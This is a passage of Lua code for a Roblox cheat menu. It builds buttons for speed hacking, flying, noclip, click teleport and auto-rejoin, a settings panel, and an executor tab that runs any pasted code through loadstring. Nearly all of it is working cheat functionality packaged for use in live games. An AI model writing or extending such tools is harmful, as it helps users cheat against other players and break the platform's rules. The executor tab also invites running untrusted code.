local speedLabel = Instance.new("TextLabel")
speedLabel.Parent = worldPanel
speedLabel.Size = UDim2.new(1,0,0,30)
speedLabel.Text = "// @ Speed: 16"
speedLabel.BackgroundTransparency = 1
speedLabel.TextColor3 = Color3.new(0,0,0)
speedLabel.Font = robotoMono
speedLabel.TextSize = 15

local speedSlider = Instance.new("Frame")
speedSlider.Parent = worldPanel
speedSlider.Size = UDim2.new(1,0,0,20)
speedSlider.BackgroundColor3 = Color3.fromRGB(245,245,245)
Instance.new("UICorner", speedSlider).CornerRadius = UDim.new(0,10)

local speedFill = Instance.new("Frame")
speedFill.Parent = speedSlider
speedFill.Size = UDim2.new(0.03,0,1,0)
speedFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", speedFill).CornerRadius = UDim.new(0,10)

local draggingSpeed = false
speedSlider.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingSpeed = true
    end
end)

UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingSpeed = false
    end
end)

UIS.InputChanged:Connect(function(i)
    if draggingSpeed and i.UserInputType == Enum.UserInputType.MouseMovement then
        local p = math.clamp((i.Position.X - speedSlider.AbsolutePosition.X) / speedSlider.AbsoluteSize.X, 0, 1)
        speedFill.Size = UDim2.new(p,0,1,0)
        local speed = math.floor(1 + (499 * p))
        speedLabel.Text = "// @ Speed: " .. speed
        if LocalPlayer.Character then
            local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = speed end
        end
    end
end)

----------------------------------------------------------------
-- FLY (ON / OFF)
----------------------------------------------------------------
local flying = false
local flyConn
local flyBtn = Instance.new("TextButton")
flyBtn.Parent = worldPanel
flyBtn.Size = UDim2.new(1,0,0,36)
flyBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
flyBtn.Text = "// @ Fly: OFF"
flyBtn.TextColor3 = Color3.new(0,0,0)
flyBtn.Font = robotoMono
flyBtn.TextSize = 15
Instance.new("UICorner", flyBtn).CornerRadius = UDim.new(0,6)

flyBtn.MouseButton1Click:Connect(function()
    flying = not flying
    flyBtn.Text = "// @ Fly: " .. (flying and "ON" or "OFF")
    if flying then
        flyConn = RunService.RenderStepped:Connect(function()
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Velocity = Vector3.new(0,50,0)
            end
        end)
    else
        if flyConn then flyConn:Disconnect() end
    end
end)

----------------------------------------------------------------
-- TP TOOL
----------------------------------------------------------------
local tpBtn = Instance.new("TextButton")
tpBtn.Parent = worldPanel
tpBtn.Size = UDim2.new(1,0,0,36)
tpBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
tpBtn.Text = "// @ Tp"
tpBtn.TextColor3 = Color3.new(0,0,0)
tpBtn.Font = robotoMono
tpBtn.TextSize = 15
Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0,6)

tpBtn.MouseButton1Click:Connect(function()
    local tool = Instance.new("Tool")
    tool.Name = ""
    tool.RequiresHandle = false
    tool.Parent = LocalPlayer.Backpack
    tool.Activated:Connect(function()
        local mouse = LocalPlayer:GetMouse()
        if mouse.Hit and LocalPlayer.Character then
            LocalPlayer.Character:MoveTo(mouse.Hit.Position)
        end
    end)
end)

----------------------------------------------------------------
-- REJOIN AFTER DEATH (FINAL)
----------------------------------------------------------------
local rejoinOnDeath = false
local deathConn
local rejoinBtn = Instance.new("TextButton")
rejoinBtn.Parent = worldPanel
rejoinBtn.Size = UDim2.new(1,0,0,36)
rejoinBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
rejoinBtn.Text = "// @ Rejoin After Death: OFF"
rejoinBtn.TextColor3 = Color3.new(0,0,0)
rejoinBtn.Font = robotoMono
rejoinBtn.TextSize = 15
Instance.new("UICorner", rejoinBtn).CornerRadius = UDim.new(0,6)

local function hookDeath(char)
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then
        if deathConn then deathConn:Disconnect() end
        deathConn = hum.Died:Connect(function()
            if rejoinOnDeath then
                task.wait(1)
                TeleportService:Teleport(game.PlaceId, LocalPlayer)
            end
        end)
    end
end

rejoinBtn.MouseButton1Click:Connect(function()
    rejoinOnDeath = not rejoinOnDeath
    rejoinBtn.Text = "// @ Rejoin After Death: " .. (rejoinOnDeath and "ON" or "OFF")
    if rejoinOnDeath and LocalPlayer.Character then
        hookDeath(LocalPlayer.Character)
    end
end)

LocalPlayer.CharacterAdded:Connect(function(char)
    if rejoinOnDeath then
        hookDeath(char)
    end
end)

----------------------------------------------------------------
-- NO CLIP (FINAL)
----------------------------------------------------------------
local noclip = false
local noclipConn
local noclipBtn = Instance.new("TextButton")
noclipBtn.Parent = worldPanel
noclipBtn.Size = UDim2.new(1,0,0,36)
noclipBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
noclipBtn.Text = "// @ No Clip: OFF"
noclipBtn.TextColor3 = Color3.new(0,0,0)
noclipBtn.Font = robotoMono
noclipBtn.TextSize = 15
Instance.new("UICorner", noclipBtn).CornerRadius = UDim.new(0,6)

local function enableNoclip()
    noclipConn = RunService.Stepped:Connect(function()
        if LocalPlayer.Character then
            for _,v in ipairs(LocalPlayer.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end
    end)
end

local function disableNoclip()
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
end

noclipBtn.MouseButton1Click:Connect(function()
    noclip = not noclip
    noclipBtn.Text = "// @ No Clip: " .. (noclip and "ON" or "OFF")
    if noclip then
        enableNoclip()
    else
        disableNoclip()
    end
end)

-- auto reapply after respawn
LocalPlayer.CharacterAdded:Connect(function()
    if noclip then
        task.wait(1)
        enableNoclip()
    end
end)

----------------------------------------------------------------
-- REJOIN
----------------------------------------------------------------
local rejoinBtn = Instance.new("TextButton")
rejoinBtn.Parent = worldPanel
rejoinBtn.Size = UDim2.new(1,0,0,36)
rejoinBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
rejoinBtn.Text = "// @ Rejoin"
rejoinBtn.TextColor3 = Color3.new(0,0,0)
rejoinBtn.Font = robotoMono
rejoinBtn.TextSize = 15
Instance.new("UICorner", rejoinBtn).CornerRadius = UDim.new(0,6)

rejoinBtn.MouseButton1Click:Connect(function()
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end)

----------------------------------------------------------------
-- COMING SOON
----------------------------------------------------------------
local comingSoon = Instance.new("TextLabel")
comingSoon.Parent = worldPanel
comingSoon.Size = UDim2.new(1,0,0,30)
comingSoon.Text = "// @ Soon"
comingSoon.BackgroundTransparency = 1
comingSoon.TextColor3 = Color3.fromRGB(120,120,120)
comingSoon.Font = robotoMono
comingSoon.TextSize = 15

----------------------------------------------------------------
-- SETTINGS PANEL (FULL WORKING VERSION - 2026)
----------------------------------------------------------------
local settingsPanel = allTabPanels["SETTINGS"]

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local robotoMono = Enum.Font.RobotoMono

-- Assuming these are already defined earlier in your script:
-- main (the main frame)
-- currentTheme
-- themes (table of themes)
-- applyTheme() function

----------------------------------------------------------------
-- TRANSPARENCY SLIDER
----------------------------------------------------------------
local transLabel = Instance.new("TextLabel")
transLabel.Parent = settingsPanel
transLabel.Size = UDim2.new(1, 0, 0, 30)
transLabel.Text = "GUI Transparency: 0%"
transLabel.BackgroundTransparency = 1
transLabel.TextColor3 = Color3.new(0, 0, 0)
transLabel.Font = robotoMono
transLabel.TextSize = 16
transLabel.TextXAlignment = Enum.TextXAlignment.Left

local slider = Instance.new("Frame")
slider.Parent = settingsPanel
slider.Size = UDim2.new(1, 0, 0, 20)
slider.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
slider.BorderSizePixel = 0

local fill = Instance.new("Frame")
fill.Parent = slider
fill.Size = UDim2.new(0, 0, 1, 0)  -- start at 0, will be set later
fill.BackgroundColor3 = Color3.fromRGB(100, 180, 255)  -- nicer color
fill.BorderSizePixel = 0

Instance.new("UICorner", slider).CornerRadius = UDim.new(0, 10)
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)

local draggingSlider = false

slider.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingSlider = true
        -- trigger initial position update
        local pos = input.Position.X - slider.AbsolutePosition.X
        local p = math.clamp(pos / slider.AbsoluteSize.X, 0, 1)
        fill.Size = UDim2.new(p, 0, 1, 0)
        if main then main.BackgroundTransparency = p * 0.7 end
        transLabel.Text = "GUI Transparency: " .. math.floor(p * 100) .. "%"
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingSlider = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local p = math.clamp((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
        fill.Size = UDim2.new(p, 0, 1, 0)
        if main then main.BackgroundTransparency = p * 0.7 end
        transLabel.Text = "GUI Transparency: " .. math.floor(p * 100) .. "%"
    end
end)

-- Set initial value (50% transparency by default)
fill.Size = UDim2.new(0.5, 0, 1, 0)
if main then main.BackgroundTransparency = 0.35 end

----------------------------------------------------------------
-- KEYBIND (WORKING - temporary connection)
----------------------------------------------------------------
local toggleKey = Enum.KeyCode.RightControl

local keybindLabel = Instance.new("TextLabel")
keybindLabel.Parent = settingsPanel
keybindLabel.Size = UDim2.new(1, 0, 0, 30)
keybindLabel.Text = "Toggle Key: RightControl"
keybindLabel.BackgroundTransparency = 1
keybindLabel.TextColor3 = Color3.new(0, 0, 0)
keybindLabel.Font = robotoMono
keybindLabel.TextSize = 16
keybindLabel.TextXAlignment = Enum.TextXAlignment.Left

local keybindBtn = Instance.new("TextButton")
keybindBtn.Parent = settingsPanel
keybindBtn.Size = UDim2.new(1, 0, 0, 40)
keybindBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
keybindBtn.Text = "Set Keybind"
keybindBtn.TextColor3 = Color3.new(0, 0, 0)
keybindBtn.Font = robotoMono
keybindBtn.TextSize = 16
keybindBtn.BorderSizePixel = 0

Instance.new("UICorner", keybindBtn).CornerRadius = UDim.new(0, 6)

keybindBtn.MouseButton1Click:Connect(function()
    keybindBtn.Text = "Press any key... (Esc to cancel)"
    keybindBtn.BackgroundColor3 = Color3.fromRGB(220, 220, 220)

    local conn
    conn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end

        local key = input.KeyCode
        if key ~= Enum.KeyCode.Unknown then
            if key == Enum.KeyCode.Escape then
                -- cancel
                keybindBtn.Text = "Set Keybind"
                keybindBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
            else
                toggleKey = key
                keybindLabel.Text = "Toggle Key: " .. key.Name
                keybindBtn.Text = "Set Keybind"
                keybindBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
            end
            conn:Disconnect()
        end
    end)
end)

----------------------------------------------------------------
-- THEME SELECTOR
----------------------------------------------------------------
local themeLabel = Instance.new("TextLabel")
themeLabel.Parent = settingsPanel
themeLabel.Size = UDim2.new(1, 0, 0, 30)
themeLabel.Text = "Theme: " .. (currentTheme or "Default")
themeLabel.BackgroundTransparency = 1
themeLabel.TextColor3 = Color3.new(0, 0, 0)
themeLabel.Font = robotoMono
themeLabel.TextSize = 16
themeLabel.TextXAlignment = Enum.TextXAlignment.Left

for name, _ in pairs(themes or {}) do
    local btn = Instance.new("TextButton")
    btn.Parent = settingsPanel
    btn.Size = UDim2.new(1, 0, 0, 36)
    btn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    btn.Text = name
    btn.TextColor3 = Color3.new(0, 0, 0)
    btn.Font = robotoMono
    btn.TextSize = 15
    btn.BorderSizePixel = 0

    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

    btn.MouseButton1Click:Connect(function()
        currentTheme = name
        themeLabel.Text = "Theme: " .. name
        if applyTheme then applyTheme() end
    end)
end

----------------------------------------------------------------
-- DELETE GUI BUTTON (Black Theme - Direct Click to Delete)
----------------------------------------------------------------
local destroyBtn = Instance.new("TextButton")
destroyBtn.Parent = settingsPanel
destroyBtn.Size = UDim2.new(1, 0, 0, 50)
destroyBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)   -- dark black/gray
destroyBtn.Text = "DESTROY GUI"
destroyBtn.TextColor3 = Color3.fromRGB(220, 220, 220)     -- light gray/white for readability
destroyBtn.Font = robotoMono
destroyBtn.TextSize = 15
destroyBtn.BorderSizePixel = 0

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = destroyBtn

-- Optional: subtle hover effect (darkens slightly)
destroyBtn.MouseEnter:Connect(function()
    TweenService:Create(destroyBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    }):Play()
end)

destroyBtn.MouseLeave:Connect(function()
    TweenService:Create(destroyBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    }):Play()
end)

-- Click → delete the entire GUI (no confirmation needed)
destroyBtn.MouseButton1Click:Connect(function()
    -- Quick fade-out animation before destroy
    TweenService:Create(destroyBtn, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        BackgroundTransparency = 1,
        TextTransparency = 1
    }):Play()

    task.delay(0.3, function()
        local screenGui = destroyBtn:FindFirstAncestorWhichIsA("ScreenGui")
        if screenGui then
            screenGui:Destroy()
            print("GUI deleted (black delete button used)")
        end
    end)
end)
----------------------------------------------------------------
-- LUA EXECUTOR
----------------------------------------------------------------
local executorPanel = allTabPanels["LUA EXECUTOR"]

local execBtn = new("TextButton", {
	Parent = executorPanel,
	Size = UDim2.new(1, 0, 0, 40),
	BackgroundColor3 = Color3.fromRGB(200,200,200),
	Text = "EXECUTE",
	TextColor3 = Color3.new(0,0,0),
	Font = Enum.Font.RobotoMono,
	TextSize = 16,
})
new("UICorner", {CornerRadius = UDim.new(0,6), Parent = execBtn})

local codeBox = new("TextBox", {
	Parent = executorPanel,
	Size = UDim2.new(1, 0, 1, -50),
	Position = UDim2.new(0, 0, 0, 50),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	Text = "-- // @ Monsy ",
	MultiLine = true,
	TextColor3 = Color3.new(0,0,0),
	Font = Enum.Font.RobotoMono,
	TextSize = 14,
	ClearTextOnFocus = false,
})
new("UICorner", {CornerRadius = UDim.new(0,6), Parent = codeBox})

execBtn.MouseButton1Click:Connect(function()
	local success, err = pcall(function()
		loadstring(codeBox.Text)()
	end)
	if not success then warn("Executor Error: " .. err) end
end)

----------------------------------------------------------------
-- DRAGGABLE WINDOW
----------------------------------------------------------------
do
	local draggingFrame, dragInput, dragStart, startPos

	local function update(i)
		local d = i.Position - dragStart
		main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end

	main.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 then
			draggingFrame = true
			dragStart = i.Position
			startPos = main.Position

			i.Changed:Connect(function()
				if i.UserInputState == Enum.UserInputState.End then
					draggingFrame = false
				end
			end)
		end
	end)

	main.InputChanged:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = i
		end
	end)

	UserInputService.InputChanged:Connect(function(i)
		if i == dragInput and draggingFrame then
			update(i)
		end
	end)
end

----------------------------------------------------------------
-- ⭐ ENHANCED GUI TOGGLE FIX ⭐
----------------------------------------------------------------
UserInputService.InputBegan:Connect(function(i, gp)
	if gp then return end
	if i.KeyCode == toggleKey then

		-- Toggle visibility
		screenGui.Enabled = not screenGui.Enabled

		if screenGui.Enabled then
			-- Hide all panels first (fix invisible tab bug)
			for name, panel in pairs(allTabPanels) do
				panel.Visible = false
			end

			-- Restore last opened tab (enhanced)
			if lastTab and allTabPanels[lastTab] then
				showTab(lastTab)
			else
				showTab("MAIN MENU")
			end

			task.wait()
			applyTheme() -- ensure colors update
		end
	end
end)

-- Initial theme apply
applyTheme()